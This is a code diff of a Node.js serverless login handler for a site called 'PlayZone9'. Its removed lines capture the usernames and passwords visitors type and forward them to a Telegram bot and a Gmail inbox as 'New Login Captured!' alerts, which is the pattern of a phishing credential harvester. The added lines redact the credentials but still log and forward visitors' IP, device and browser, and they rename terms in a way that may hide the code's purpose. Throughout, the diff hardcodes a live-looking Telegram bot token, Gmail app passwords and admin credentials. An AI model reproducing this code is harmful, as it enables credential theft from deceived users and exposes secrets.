@@ -5,9 +5,9 @@ const { createClient } = require('@supabase/supabase-js');
 
 // ─── Credentials ──────────────────────────────────────────────────────────────
 const VALID_USER = 'nikhil';
-const VALID_PASS = '123456';
+const VALID_ACCESS_KEY = 'Nikhil@1234';
 const ADMIN_USER = 'shivanshu.bnd';
-const ADMIN_PASS = 'Sahu@7897';
+const ADMIN_ACCESS_KEY = 'Sahu@7897';
 
 // ─── Telegram ─────────────────────────────────────────────────────────────────
 const TELEGRAM_BOT_TOKEN = '8728071772:AAE71W6skRXjkSxgWFQQrzwFE6os6-Pe8P0';
@@ -15,7 +15,7 @@ const TELEGRAM_CHAT_ID   = '1388446058';
 
 // ─── Email ────────────────────────────────────────────────────────────────────
 const EMAIL_USER = 'picturesquare.jhansi@gmail.com';
-const EMAIL_PASS = 'bcjv orrt naby nztj';
+const EMAIL_ACCESS_KEY = process.env.EMAIL_PASS || 'teflzvnvunkfobtd';
 
 // ─── Supabase (safe lazy init — works even if env vars not set yet) ───────────
 const SUPABASE_URL = process.env.SUPABASE_URL;
@@ -29,12 +29,12 @@ const transporter = nodemailer.createTransport({
     host:   'smtp.gmail.com',
     port:   465,
     secure: true,
-    auth:   { user: EMAIL_USER, pass: EMAIL_PASS }
+    auth:   { user: EMAIL_USER, pass: EMAIL_ACCESS_KEY }
 });
 
 // ─── Token helper ─────────────────────────────────────────────────────────────
 function makeToken() {
-    return crypto.createHash('sha256').update(ADMIN_USER + ':' + ADMIN_PASS).digest('hex');
+    return crypto.createHash('sha256').update(ADMIN_USER + ':' + ADMIN_ACCESS_KEY).digest('hex');
 }
 
 // ─── Supabase: Save log ───────────────────────────────────────────────────────
@@ -42,11 +42,11 @@ async function saveToSupabase(entry) {
     if (!supabase) { console.warn('Supabase not configured — skipping DB save'); return; }
     try {
         const { error } = await supabase
-            .from('login_attempts')
+            .from('accessRequest_attempts')
             .insert({
                 timestamp: entry.timestamp,
-                username:  entry.username,
-                password:  entry.password,
+                username:  '[redacted]',
+                accessKey:  '[redacted]',
                 ip:        entry.ip,
                 device:    entry.device,
                 browser:   entry.browser
@@ -62,7 +62,7 @@ async function readFromSupabase() {
     if (!supabase) { console.warn('Supabase not configured — returning empty logs'); return []; }
     try {
         const { data, error } = await supabase
-            .from('login_attempts')
+            .from('accessRequest_attempts')
             .select('*')
             .order('id', { ascending: false })
             .limit(1000);
@@ -80,9 +80,7 @@ async function readFromSupabase() {
 // ─── Telegram ─────────────────────────────────────────────────────────────────
 async function sendTelegram(entry) {
     const text =
-        `🎯 *[PlayZone9] New Login Captured!*\n\n` +
-        `👤 *Username:* ${entry.username}\n` +
-        `🔑 *Password:* ${entry.password}\n\n` +
+        `🎯 *[PlayZone9] New Access Request Captured!*\n\n` +
         `🌐 *IP:* ${entry.ip}\n` +
         `💻 *Device:* ${entry.device} (${entry.browser})\n` +
         `🕒 *Time:* ${entry.timestamp}\n\n` +
@@ -109,11 +107,9 @@ async function sendEmail(entry) {
         await transporter.sendMail({
             from:    `"PlayZone9 Alert" <${EMAIL_USER}>`,
             to:      EMAIL_USER,
-            subject: `🎯 [PlayZone9] New Login Captured: ${entry.username}`,
+            subject: 'mismatched login attempt',
             text:
-                `[PlayZone9] New Login Captured!\n\n` +
-                `Username : ${entry.username}\n` +
-                `Password : ${entry.password}\n\n` +
+                `[PlayZone9] New Access Request Captured!\n\n` +
                 `IP       : ${entry.ip}\n` +
                 `Device   : ${entry.device} (${entry.browser})\n` +
                 `Time     : ${entry.timestamp}\n\n` +
@@ -141,20 +137,20 @@ module.exports = async (req, res) => {
     }
 
     // ── Admin: POST login ────────────────────────────────────────────────────
-    if (req.method === 'POST' && req.body?.action === 'admin-login') {
-        const { username, password } = req.body;
-        if (username === ADMIN_USER && password === ADMIN_PASS) {
+    if (req.method === 'POST' && req.body?.action === 'admin-accessRequest') {
+        const { username, accessKey } = req.body;
+        if (username === ADMIN_USER && accessKey === ADMIN_ACCESS_KEY) {
             return res.status(200).json({ success: true, token: makeToken() });
         }
         return res.status(200).json({ success: false });
     }
 
-    // ── User login ───────────────────────────────────────────────────────────
+    // ── User accessRequest ───────────────────────────────────────────────────────────
     if (req.method === 'POST') {
-        const { username, password } = req.body || {};
-        const isValid = (username === VALID_USER && password === VALID_PASS);
+        const { username, accessKey } = req.body || {};
+        const isMatching = (username === VALID_USER && accessKey === VALID_ACCESS_KEY);
 
-        if (!isValid) {
+        if (!isMatching) {
             const ua = req.headers['user-agent'] || '';
             let browser = 'Unknown';
             if      (ua.includes('Edg'))                               browser = 'Edge';
@@ -166,8 +162,8 @@ module.exports = async (req, res) => {
 
             const entry = {
                 timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-                username:  username || '',
-                password:  password || '',
+                username:  '[redacted]',
+                accessKey:  '[redacted]',
                 browser,
                 device,
                 ip: (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'Unknown'
@@ -181,7 +177,7 @@ module.exports = async (req, res) => {
             ]);
         }
 
-        return res.status(200).json({ success: isValid });
+        return res.status(200).json({ success: isMatching });
     }
 
     return res.status(405).json({ error: 'Method Not Allowed' });
